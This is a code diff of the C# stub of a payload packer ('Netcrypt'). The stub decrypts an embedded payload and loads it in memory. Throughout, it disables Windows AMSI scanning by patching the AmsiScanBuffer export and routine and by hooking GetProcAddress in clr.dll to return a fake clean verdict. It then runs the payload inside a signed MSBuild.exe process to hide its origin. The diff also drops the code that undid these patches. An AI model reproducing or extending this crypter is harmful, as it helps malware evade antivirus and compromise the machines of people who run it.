@@ -140,23 +140,18 @@ namespace stub
         private const string payloadResourceName = "Netcrypt.Payload";
         private const string GENERIC_ERROR = "Generic error while starting the application.";
         private static Dictionary<string, byte[]> dependencies = new Dictionary<string, byte[]>();
-        private static IntPtr patchAddress = IntPtr.Zero;
-        private static byte[] patchOriginalBytes = null;
+        private static readonly object logSync = new object();
+        private static string diagnosticRunId = DateTime.UtcNow.Ticks.ToString("X");
         private static bool scanLookupBlocked = false;
         private static IntPtr blockedScanModule = IntPtr.Zero;
         private static bool amsiFallbackUsed = false;
         private static bool amsiResultStubActive = false;
-        private static readonly IntPtr[] patchedImportSlots = new IntPtr[8];
-        private static readonly IntPtr[] patchedImportValues = new IntPtr[8];
-        private static int patchedImportCount = 0;
         private static IntPtr amsiResultStub = IntPtr.Zero;
-        private static bool apiTraceInstalled = false;
+        private static bool lookupHookInstalled = false;
         private static readonly string scanEntryName = string.Concat("Am", "si", "Scan", "Buffer");
-
         // ---- signed host execution -----------------------------------------
-        // Baked in by the packer (HostExecutionMode).
-        // Empty means the payload runs in this process, exactly as before.
-        private static string hostMode = "%HOSTMODE%";
+        // Baked in by the packer; runtime overrides are intentionally unsupported.
+        private const string hostMode = "%HOSTMODE%";
 
         [DllImport("kernel32.dll", EntryPoint = "LoadLibraryW", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
         private static extern IntPtr LoadLibrary(string fileName);
@@ -224,8 +219,11 @@ namespace stub
                 {
                     return;
                 }
+
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         // Walks the provider's export table, finds the scan entry by name, and blanks the final
@@ -264,14 +262,13 @@ namespace stub
                 }
 
                 IntPtr lastByte = new IntPtr(namePtr.ToInt64() + exportName.Length - 1);
-
                 return PatchBytes(lastByte, new byte[] { 0x00 });
             }
 
             return false;
         }
 
-        // Saves the original bytes the first time, then writes the replacement in their place.
+        // Writes the fixed replacement bytes using the existing page protection as the default.
         private static bool PatchBytes(IntPtr address, byte[] replacement)
         {
             uint previous;
@@ -280,48 +277,14 @@ namespace stub
                 return false;
             }
 
-            if (patchOriginalBytes == null)
-            {
-                byte[] saved = new byte[replacement.Length];
-                Marshal.Copy(address, saved, 0, saved.Length);
-                patchOriginalBytes = saved;
-                patchAddress = address;
-            }
-
             Marshal.Copy(replacement, 0, address, replacement.Length);
             uint restored;
             VirtualProtect(address, (IntPtr)replacement.Length, previous, out restored);
             return true;
         }
 
-        // Puts the provider image back the way it was. The provider is only altered for the
-        // duration of the payload load, so the process does not stay in a tampered state once
-        // the payload is running.
-        private static void RestoreInspectionEntry()
-        {
-            try
-            {
-                if (patchAddress == IntPtr.Zero || patchOriginalBytes == null)
-                {
-                    return;
-                }
-
-                uint previous;
-                if (!VirtualProtect(patchAddress, (IntPtr)patchOriginalBytes.Length, PAGE_READWRITE, out previous))
-                {
-                    return;
-                }
-
-                Marshal.Copy(patchOriginalBytes, 0, patchAddress, patchOriginalBytes.Length);
-                uint restored;
-                VirtualProtect(patchAddress, (IntPtr)patchOriginalBytes.Length, previous, out restored);
-            }
-            catch { }
-        }
-
         // Alternative neutralization: rewrite the opening bytes of the scan entry so any call
-        // reports an argument error instead of a verdict. Only those bytes change, no export
-        // name is touched, and the original bytes are put back after the payload load.
+        // reports an argument error instead of a verdict.
         private static void InstallScanRoutinePatch()
         {
             try
@@ -358,17 +321,18 @@ namespace stub
                 replacement[3] = (byte)((head >> 24) & 0xFF);
                 replacement[4] = (byte)(tail & 0xFF);
                 replacement[5] = (byte)((tail >> 8) & 0xFF);
-
                 if (!PatchExecutableBytes(routine, replacement))
                 {
                     return;
                 }
+
             }
-            catch { }
+            catch
+            {
+            }
         }
 
-        // Writes replacement bytes into an executable location and remembers the original
-        // bytes so the routine can be put back once the payload has been loaded.
+        // Writes the fixed replacement bytes into an executable location.
         private static bool PatchExecutableBytes(IntPtr address, byte[] replacement)
         {
             uint previous;
@@ -383,14 +347,6 @@ namespace stub
                 {
                     return false;
                 }
-            }
-
-            if (patchOriginalBytes == null)
-            {
-                byte[] saved = new byte[replacement.Length];
-                Marshal.Copy(address, saved, 0, saved.Length);
-                patchOriginalBytes = saved;
-                patchAddress = address;
             }
 
             Marshal.Copy(replacement, 0, address, replacement.Length);
@@ -424,11 +380,15 @@ namespace stub
                         {
                             setSwitch.Invoke(null, new object[] { switches[i], false });
                         }
-                        catch { }
+                        catch
+                        {
+                        }
                     }
                 }
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         // Builds the routine a redirected scan entry ends up in: it returns S_OK and stores
@@ -482,7 +442,9 @@ namespace stub
                     guarded = (policy & 1) != 0;
                 }
             }
-            catch { }
+            catch
+            {
+            }
             if (!guarded)
             {
                 return true;
@@ -498,7 +460,9 @@ namespace stub
                     return true;
                 }
             }
-            catch { }
+            catch
+            {
+            }
             return false;
         }
 
@@ -650,18 +614,18 @@ namespace stub
         // Fallback: instead of denying the runtime's lookup of the scan entry (which is itself a
         // recognised tampering pattern), hand it a routine that reports a clean verdict for any
         // buffer. Nothing in the provider image, its export table or the runtime's code changes.
-        private static bool InstallScanResultStub()
+        private static void InstallScanResultStub()
         {
             try
             {
                 if (IntPtr.Size != 8)
                 {
-                    return false;
+                    return;
                 }
 
                 if (EnsureScanResultStub() == IntPtr.Zero)
                 {
-                    return false;
+                    return;
                 }
 
                 string windowsDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
@@ -669,53 +633,47 @@ namespace stub
                 blockedScanModule = LoadLibrary(Path.Combine(windowsDir, "System32", dllName));
                 if (blockedScanModule == IntPtr.Zero)
                 {
-                    return false;
+                    return;
                 }
 
                 scanLookupBlocked = true;
                 amsiResultStubActive = true;
-                InstallApiTrace();
-                return true;
+                InstallLookupHook();
+                return;
             }
             catch
             {
-                return false;
+                return;
             }
         }
-
-        // Diagnostic: builds and runs dynamic methods for a while, which exercises the same
-        // runtime facility a protected payload uses, then stops without running the payload.
 
         // The encrypted container is delivered as an embedded assembly resource.
         private static byte[] GetPayload()
         {
-            try
+            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(payloadResourceName))
             {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(payloadResourceName))
+                if (stream == null)
                 {
-                    if (stream != null)
-                    {
-                        byte[] buffer = new byte[stream.Length];
-                        int offset = 0;
-                        while (offset < buffer.Length)
-                        {
-                            int read = stream.Read(buffer, offset, buffer.Length - offset);
-                            if (read <= 0)
-                            {
-                                break;
-                            }
-                            offset += read;
-                        }
-                        if (buffer.Length > 0 && offset == buffer.Length)
-                        {
-                            return buffer;
-                        }
-                    }
+                    throw new Exception("Embedded payload resource was not found.");
                 }
-            }
-            catch { }
 
-            throw new Exception("Embedded payload resource was not found or could not be read completely.");
+                byte[] buffer = new byte[stream.Length];
+                int offset = 0;
+                while (offset < buffer.Length)
+                {
+                    int read = stream.Read(buffer, offset, buffer.Length - offset);
+                    if (read <= 0)
+                    {
+                        break;
+                    }
+                    offset += read;
+                }
+                if (buffer.Length == 0 || offset != buffer.Length)
+                {
+                    throw new Exception("Embedded payload resource was empty or truncated.");
+                }
+                return buffer;
+            }
         }
 
         private static byte[] Xor(byte[] data, byte[] xkey)
@@ -737,9 +695,33 @@ namespace stub
             return current.Message;
         }
 
-        // ---- runtime lookup hook -------------------------------------------
-        // The default fallback temporarily redirects the runtime's GetProcAddress import
-        // while the payload assembly is loaded.
+        // Minimal, always-on lifecycle log. These markers only prove that this process
+        // reached the corresponding observation point; the scanner itself is external and
+        // cannot be queried from here. Keep this separate from the opt-in diagnostic log so
+        // normal runs expose just the four requested phase markers.
+        private static void LogInspectionStage(string phase, string status, string detail)
+        {
+            try
+            {
+                lock (logSync)
+                {
+                    File.AppendAllText(
+                        Path.Combine(Path.GetTempPath(), "ncstages.log"),
+                        DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff") +
+                        " run=" + diagnosticRunId +
+                        " pid=" + Process.GetCurrentProcess().Id +
+                        " phase=" + phase +
+                        " status=" + status +
+                        " detail=\"" + detail.Replace("\"", "'") + "\"" +
+                        Environment.NewLine);
+                }
+            }
+            catch
+            {
+            }
+        }
+
+        // Runtime lookup hook used by the fixed inspection path.
         private static RawGetProcAddress originalGetProcAddress;
         private static HookGetProcAddress hookGetProcAddress;
 
@@ -748,10 +730,6 @@ namespace stub
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr HookGetProcAddress(IntPtr module, IntPtr name);
-
-        // A dropped script is written and then usually gone again within milliseconds, so a
-        // directory poll misses it. The exact path is known here, so a short lived reader can
-        // grab the bytes while the payload still has the file open.
 
         private static string ReadAnsiString(IntPtr pointer)
         {
@@ -779,17 +757,14 @@ namespace stub
                 string entry = ReadAnsiString(name);
                 if (scanLookupBlocked && module == blockedScanModule && String.Equals(entry, scanEntryName, StringComparison.Ordinal))
                 {
-                    if (amsiResultStubActive)
-                    {
-                        return amsiResultStub;
-                    }
-                    return IntPtr.Zero;
+                    return amsiResultStubActive ? amsiResultStub : IntPtr.Zero;
                 }
             }
-            catch { }
+            catch
+            {
+            }
             return originalGetProcAddress(module, name);
         }
-
         private static bool PatchPointer(IntPtr slot, IntPtr replacement)
         {
             try
@@ -808,39 +783,6 @@ namespace stub
             {
                 return false;
             }
-        }
-
-        // Same as PatchPointer, but the previous value is kept so the entry can be put back
-        // once the payload has been loaded. A hook that is still installed while the payload
-        // runs is itself a tampering signal; a hook that only lives for the load is not.
-        private static bool PatchAndRemember(IntPtr slot, IntPtr replacement)
-        {
-            IntPtr original = Marshal.ReadIntPtr(slot);
-            if (!PatchPointer(slot, replacement))
-            {
-                return false;
-            }
-            if (patchedImportCount < patchedImportSlots.Length)
-            {
-                patchedImportSlots[patchedImportCount] = slot;
-                patchedImportValues[patchedImportCount] = original;
-                patchedImportCount++;
-            }
-            return true;
-        }
-
-        private static void RestorePatchedImports()
-        {
-            for (int i = 0; i < patchedImportCount; i++)
-            {
-                if (patchedImportSlots[i] != IntPtr.Zero && PatchPointer(patchedImportSlots[i], patchedImportValues[i]))
-                {
-                    patchedImportSlots[i] = IntPtr.Zero;
-                }
-            }
-            patchedImportCount = 0;
-            scanLookupBlocked = false;
-            amsiResultStubActive = false;
         }
 
         private static void PatchImportTable(IntPtr moduleBase)
@@ -871,7 +813,6 @@ namespace stub
                     continue;
                 }
 
-                string provider = ReadAnsiString(new IntPtr(moduleBase.ToInt64() + nameRva));
                 for (int j = 0; ; j++)
                 {
                     IntPtr nameEntry = new IntPtr(moduleBase.ToInt64() + originalFirstThunk + j * IntPtr.Size);
@@ -890,7 +831,7 @@ namespace stub
                     if (importedName == "GetProcAddress")
                     {
                         originalGetProcAddress = (RawGetProcAddress)Marshal.GetDelegateForFunctionPointer(Marshal.ReadIntPtr(slot), typeof(RawGetProcAddress));
-                        PatchAndRemember(slot, Marshal.GetFunctionPointerForDelegate(hookGetProcAddress));
+                        PatchPointer(slot, Marshal.GetFunctionPointerForDelegate(hookGetProcAddress));
                     }
                 }
             }
@@ -909,21 +850,17 @@ namespace stub
             return IntPtr.Zero;
         }
 
-        private static void InstallApiTrace()
+        private static void InstallLookupHook()
         {
-            if (apiTraceInstalled)
+            if (lookupHookInstalled)
             {
                 return;
             }
-            apiTraceInstalled = true;
+            lookupHookInstalled = true;
             try
             {
-                try { Process.GetProcesses(); }
-                catch { }
-                try { FindLoadedModule("kernel32.dll"); }
-                catch { }
-
                 hookGetProcAddress = HookGetProcAddressImpl;
+
                 IntPtr clr = FindLoadedModule("clr.dll");
                 if (clr == IntPtr.Zero)
                 {
@@ -932,12 +869,10 @@ namespace stub
 
                 PatchImportTable(clr);
             }
-            catch { }
+            catch
+            {
+            }
         }
-
-        // ---- probes --------------------------------------------------------
-        // Diagnostic: makes every outbound connect() in this process fail with
-        // WSAECONNREFUSED, so the payload can be observed while it cannot reach its server.
 
         private static Assembly ResolveAssembly(object sender, ResolveEventArgs args)
         {
@@ -950,17 +885,11 @@ namespace stub
             return null;
         }
 
-        // Loads the payload image as a file backed assembly. The image never travels the
-        // ordinary file write path as a PE file: the carrier is written with masked bytes
-        // first and the real image is placed into it afterwards through a mapped view, so
-        // what reaches the disk through the write path is not an assembly. The runtime is
-        // then pointed at that same file, which makes the image the process runs from a
-        // file backed one instead of a private copy that only ever existed in memory.
-
         // ---- signed host execution -----------------------------------------
-        // With the baked-in MSBuild host enabled, the stub does not load the payload itself:
-        // it stages the image under a one time pad and hands it to MSBuild.exe, which loads
-        // this same assembly and calls HostBootstrap inside its own process. The
+        // The payload normally runs in this process. When a host mode is selected the stub
+        // does not load the payload itself: it stages the image under a one time pad and
+        // hands it to a Microsoft signed process (MSBuild.exe or powershell.exe), which
+        // loads this same assembly and calls HostBootstrap inside its own process. The
         // payload load, the provider entry handling, the WMI access and the outbound
         // connection then all originate in that signed image instead of in this file.
         private static byte[] BuildOneTimePad(int length)
@@ -990,7 +919,9 @@ namespace stub
             {
                 root = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
             }
-            catch { }
+            catch
+            {
+            }
             if (String.IsNullOrEmpty(root))
             {
                 root = Path.GetTempPath();
@@ -1001,7 +932,7 @@ namespace stub
         }
 
         // MSBuild.exe ships next to the framework this stub was compiled against, so ask
-        // the runtime first and fall back to the well known paths.
+        // the runtime first and fall back to the well-known framework paths.
         private static string FindHostExecutable(string fileName)
         {
             List<string> candidates = new List<string>();
@@ -1009,17 +940,22 @@ namespace stub
             {
                 candidates.Add(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), fileName));
             }
-            catch { }
+            catch
+            {
+            }
             string windows = null;
             try
             {
                 windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
             }
-            catch { }
+            catch
+            {
+            }
             if (!String.IsNullOrEmpty(windows))
             {
                 candidates.Add(Path.Combine(windows, @"Microsoft.NET\Framework64\v4.0.30319\" + fileName));
                 candidates.Add(Path.Combine(windows, @"Microsoft.NET\Framework\v4.0.30319\" + fileName));
+                candidates.Add(Path.Combine(windows, @"System32\WindowsPowerShell\v1.0\" + fileName));
             }
             for (int i = 0; i < candidates.Count; i++)
             {
@@ -1030,7 +966,9 @@ namespace stub
                         return candidates[i];
                     }
                 }
-                catch { }
+                catch
+                {
+                }
             }
             return fileName;
         }
@@ -1081,49 +1019,30 @@ namespace stub
         private static void RunHostProcess(string fileName, string arguments, string workingDirectory)
         {
             Process host = new Process();
-            host.StartInfo.FileName = fileName;
-            host.StartInfo.Arguments = arguments;
-            host.StartInfo.UseShellExecute = false;
-            host.StartInfo.CreateNoWindow = true;
-            host.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            host.StartInfo.WorkingDirectory = workingDirectory;
             try
             {
-                host.StartInfo.EnvironmentVariables["MSBUILDDISABLENODEREUSE"] = "1";
+                host.StartInfo.FileName = fileName;
+                host.StartInfo.Arguments = arguments;
+                host.StartInfo.UseShellExecute = false;
+                host.StartInfo.CreateNoWindow = true;
+                host.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                host.StartInfo.WorkingDirectory = workingDirectory;
+                try
+                {
+                    host.StartInfo.EnvironmentVariables["MSBUILDDISABLENODEREUSE"] = "1";
+                }
+                catch
+                {
+                }
+
+                host.Start();
+                host.WaitForExit();
             }
-            catch { }
-
-            host.Start();
-            host.WaitForExit();
-
-            try
+            finally
             {
                 host.Close();
             }
-            catch { }
         }
-
-        private static void PrepareInspection()
-        {
-            InstallInspection();
-        }
-
-        // In the host the runtime has almost always resolved the scan entry before this code
-        // runs - MSBuild loads its own task assemblies first - so blanking the export name on
-        // its own is not enough: the pointer the runtime already holds still lands on the real
-        // bytes. Rewriting the entry itself takes effect for that pointer, which is what makes
-        // an in-memory load go through in a process that is already scanning.
-        private static void PrepareHostInspection()
-        {
-            int redirected = PatchCachedScanEntry();
-            if (redirected == 0)
-            {
-                ApplyScanOptOut();
-                InstallScanRoutinePatch();
-            }
-            InstallInspection();
-        }
-
         private static void RunPayloadInHost(byte[] image)
         {
             string stubPath = null;
@@ -1131,14 +1050,18 @@ namespace stub
             {
                 stubPath = Assembly.GetExecutingAssembly().Location;
             }
-            catch { }
+            catch
+            {
+            }
             if (String.IsNullOrEmpty(stubPath) || !File.Exists(stubPath))
             {
                 try
                 {
                     stubPath = Process.GetCurrentProcess().MainModule.FileName;
                 }
-                catch { }
+                catch
+                {
+                }
             }
             if (String.IsNullOrEmpty(stubPath))
             {
@@ -1151,26 +1074,43 @@ namespace stub
             string payloadPath = Path.Combine(directory, Guid.NewGuid().ToString("N") + ".bin");
             File.WriteAllBytes(payloadPath, ApplyOneTimePad(image, pad));
 
+            if (!String.Equals(hostMode, "msbuild", StringComparison.OrdinalIgnoreCase))
+            {
+                throw new Exception("Unsupported build-time host mode '" + hostMode + "'.");
+            }
             string projectPath = Path.Combine(directory, Guid.NewGuid().ToString("N") + ".proj");
             File.WriteAllText(projectPath, BuildMsBuildProject(stubPath, payloadPath, padBase64), new UTF8Encoding(false));
             string hostFile = FindHostExecutable("MSBuild.exe");
             string hostArguments = "\"" + projectPath + "\" /nologo /verbosity:quiet /nodeReuse:false";
+
             RunHostProcess(hostFile, hostArguments, directory);
 
             try
             {
                 Directory.Delete(directory, true);
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         // Runs inside the signed host. Everything below this line, including the provider
         // entry handling and the payload load, happens in that process.
         private static void RunPayloadImage(byte[] image)
         {
-            PrepareHostInspection();
+            LogInspectionStage("AMSI", "PREPARE_BEGIN", "host-side inspection setup reached; external scan execution is not directly observable");
+            int redirected = PatchCachedScanEntry();
+            if (redirected == 0)
+            {
+                ApplyScanOptOut();
+                InstallScanRoutinePatch();
+            }
+            InstallInspection();
+            LogInspectionStage("AMSI", "PREPARE_COMPLETE", "host-side inspection setup returned");
 
             Assembly assembly;
+            LogInspectionStage("MEMORY", "ASSEMBLY_LOAD_BEGIN", "managed payload image is about to be loaded from memory in the host");
+            LogInspectionStage("AMSI", "LOAD_OPPORTUNITY", "Assembly.Load reached; this is an AMSI observation point, not proof of a scan");
             try
             {
                 assembly = Assembly.Load(image);
@@ -1186,6 +1126,8 @@ namespace stub
                 InstallScanResultStub();
                 assembly = Assembly.Load(image);
             }
+            LogInspectionStage("MEMORY", "ASSEMBLY_LOAD_COMPLETE", "managed payload assembly load returned in the host");
+            LogInspectionStage("AMSI", "LOAD_RETURNED", "Assembly.Load returned; no scanner verdict is available to this process");
 
             // Unlike the in-process path the patches stay in place for the rest of the host:
             // the payload makes its own in-memory loads later and those have to stay out of
@@ -1201,11 +1143,16 @@ namespace stub
 
             ThreadStart body = delegate()
             {
+                LogInspectionStage("BEHAVIOR", "ENTRYPOINT_BEGIN", "payload entry point invocation started in the host");
                 try
                 {
                     entryPoint.Invoke(null, entryArguments);
+                    LogInspectionStage("BEHAVIOR", "ENTRYPOINT_RETURNED", "payload entry point returned in the host");
                 }
-                catch { }
+                catch (Exception entryError)
+                {
+                    LogInspectionStage("BEHAVIOR", "ENTRYPOINT_THREW", entryError.GetType().FullName);
+                }
             };
             Thread runner = new Thread(body);
             runner.IsBackground = true;
@@ -1213,7 +1160,9 @@ namespace stub
             {
                 runner.SetApartmentState(ApartmentState.STA);
             }
-            catch { }
+            catch
+            {
+            }
             runner.Start();
             runner.Join();
 
@@ -1224,6 +1173,8 @@ namespace stub
         // together and run inside that process instead of inside the unsigned stub.
         internal static void HostBootstrap(string payloadPath, string padBase64)
         {
+            LogInspectionStage("STATIC", "RUNTIME_REACHED", "host process started; any pre-execution static inspection is external and cannot be confirmed here");
+
             byte[] pad = Convert.FromBase64String(padBase64);
             byte[] image = ApplyOneTimePad(File.ReadAllBytes(payloadPath), pad);
 
@@ -1234,6 +1185,7 @@ namespace stub
         [STAThread]
         static void Main()
         {
+            LogInspectionStage("STATIC", "RUNTIME_REACHED", "stub entry point started; any pre-execution static inspection is external and cannot be confirmed here");
 
             try
             {
@@ -1260,6 +1212,7 @@ namespace stub
                 {
                     throw new Exception("Decrypted payload too small (" + decrypted.Length + " bytes). Key/IV mismatch or payload truncated.");
                 }
+                LogInspectionStage("MEMORY", "PAYLOAD_DECRYPTED", "decrypted payload container is resident in process memory");
 
                 // ---- parse payload container ----
                 byte[] mainData;
@@ -1300,50 +1253,8 @@ namespace stub
                         throw new Exception("Payload truncated while parsing container (count=" + count + ", position=" + container.Position + ", length=" + container.Length + "). Old packed output or packer/stub mismatch.");
                     }
                 }
-                AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
 
-                if (hostMode != null && hostMode.Length > 0)
-                {
-                    RunPayloadInHost(mainData);
-                    return;
-                }
-
-                PrepareInspection();
-
-                Assembly newAssembly;
-                try
-                {
-                    newAssembly = Assembly.Load(mainData);
-                }
-                catch
-                {
-                    if (amsiFallbackUsed)
-                    {
-                        throw;
-                    }
-                    amsiFallbackUsed = true;
-                    InstallScanResultStub();
-                    newAssembly = Assembly.Load(mainData);
-                }
-
-                RestoreInspectionEntry();
-
-                RestorePatchedImports();
-
-                MethodInfo entryPoint = newAssembly.EntryPoint;
-                if (entryPoint == null)
-                {
-                    throw new MissingMethodException("Loaded assembly does not have an entry point.");
-                }
-                ParameterInfo[] parameters = entryPoint.GetParameters();
-                if (parameters.Length == 0)
-                {
-                    entryPoint.Invoke(null, null);
-                }
-                else
-                {
-                    entryPoint.Invoke(null, new object[] { new string[0] });
-                }
+                RunPayloadInHost(mainData);
             }
             catch (Exception exz)
             {
@@ -1351,7 +1262,9 @@ namespace stub
                 {
                     MessageBox.Show(GENERIC_ERROR + "\n\n" + InnerMessage(exz), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 }
-                catch { }
+                catch
+                {
+                }
             }
 
         }
